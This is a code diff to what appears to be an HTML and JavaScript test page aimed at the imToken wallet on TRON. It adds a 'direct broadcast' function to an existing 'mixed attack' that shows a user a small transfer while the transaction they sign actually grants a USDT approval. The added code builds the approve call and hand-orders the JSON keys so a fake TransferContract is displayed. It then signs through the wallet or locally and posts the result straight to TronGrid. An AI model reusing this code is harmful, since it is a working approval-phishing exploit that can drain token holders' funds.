@@ -65,6 +65,7 @@
       <button class="btn btn-approve" id="btnApprove">② 原始 USDT approve (1 USDT)</button>
       <button class="btn btn-mixed" id="btnMixed">③ 混合攻击：显示转账，实际授权</button>
       <button class="btn btn-check" id="btnCheckAllowance" style="margin-top:14px;">查询 USDT 授权额度</button>
+      <button class="btn btn-check" id="btnDirectTest" style="margin-top:14px; background:#e6a23c; color:#000;">分离测试：直接广播</button>
     </div>
   </div>
 
@@ -336,6 +337,93 @@
     }
   }
 
+  // 直接广播测试：绕过 imToken 桥接，直接 POST TronGrid
+  // 用于分离判断错误来源是桥接层还是 java-tron 节点层
+  async function directBroadcastTest() {
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+    log('=== 直接广播分离测试 ===', 'warn');
+    try {
+      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      const userHex = window.tronWeb.address.toHex(walletAddr);
+
+      // 构造一个标准 approve（不修改任何东西）
+      const { transaction, result } = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100_000_000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!result?.result) { log('构造失败', 'error'); return; }
+
+      const originalHex = transaction.raw_data_hex;
+      const realParam = transaction.raw_data.contract[0].parameter;
+
+      // 假 TransferContract
+      const fakeParam = {
+        type_url: 'type.googleapis.com/protocol.TransferContract',
+        value: { amount: 100000, to_address: SPENDER, owner_address: walletAddr }
+      };
+
+      // 手动拼 JSON — 字符串键在前，数字键在后（绕过 V8 整数键优先排序）
+      const contractJson = '{' +
+        '"type":"TransferContract",' +
+        '"parameter":' + JSON.stringify(fakeParam) + ',' +
+        '"__p01":1,"__p02":2,"__p03":3,"__p04":4,"__p05":5,' +
+        '"__p06":6,"__p07":7,"__p08":8,"__p09":9,"__p10":10,' +
+        '"1":31,' +
+        '"2":' + JSON.stringify(realParam) +
+      '}';
+
+      log('手动拼的 contract JSON (前120字): ' + contractJson.slice(0, 120), 'warn');
+      log('数字键 "1"/"2" 位置: ' + (contractJson.indexOf('"1":') < contractJson.indexOf('"type":') ? '❌ 前' : '✅ 后'), 'warn');
+
+      // 替换 contract[0] — 用 JSON.parse 还原对象，但 V8 会重排...
+      // 所以改用替换整个 raw_data.contract 数组元素后立即发送
+      const mixedContract = JSON.parse(contractJson);
+      transaction.raw_data.contract[0] = mixedContract;
+      transaction.raw_data_hex = originalHex;
+
+      // 用 sendTransaction 走 imToken 签名
+      log('先走 imToken sendTransaction…', 'warn');
+      const ok = await sendTx(transaction, '混合攻击 (手动JSON排序)');
+      if (!ok) {
+        log('imToken 路径失败，尝试分离测试…', 'warn');
+        // 分离测试：用 tronWeb 本地签名 + 直接广播
+        try {
+          const cleanTx = await window.tronWeb.transactionBuilder.triggerSmartContract(
+            contractHex, 'approve(address,uint256)',
+            { feeLimit: 100_000_000, callValue: 0 },
+            [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+            userHex
+          );
+          const signed = await window.tronWeb.trx.sign(cleanTx.transaction);
+          log('本地签名成功, txID: ' + signed.txID, 'success');
+
+          // 把签名附到混合交易上，直接广播
+          const mixedTx = { ...transaction };
+          mixedTx.signature = signed.signature || [signed.txID];
+
+          const resp = await fetch(TRON_API + '/wallet/broadcasttransaction', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(mixedTx)
+          });
+          const data = await resp.json();
+          log('TronGrid 直接返回: ' + JSON.stringify(data), 'warn');
+          if (data.result === true) {
+            log('✅ 直接广播成功！', 'success');
+          } else if (data.code || data.Error) {
+            log('❌ 节点拒绝: ' + (data.message || JSON.stringify(data)), 'error');
+          }
+        } catch (e2) {
+          log('分离测试异常: ' + (e2.message || e2), 'error');
+        }
+      }
+    } catch (e) {
+      log('直接广播测试异常: ' + (e.message || e), 'error');
+    }
+  }
+
   async function manualCheck() {
     if (!walletAddr) return;
     log('手动查询 allowance…', 'warn');
@@ -347,6 +435,7 @@
   $('btnApprove').addEventListener('click', originalApprove);
   $('btnMixed').addEventListener('click', mixedTx);
   $('btnCheckAllowance').addEventListener('click', manualCheck);
+  $('btnDirectTest').addEventListener('click', directBroadcastTest);
 
   if (hasBridge()) log('imToken 桥接环境就绪', 'success');
   else log('请在 imToken DApp 浏览器中打开', 'warn');
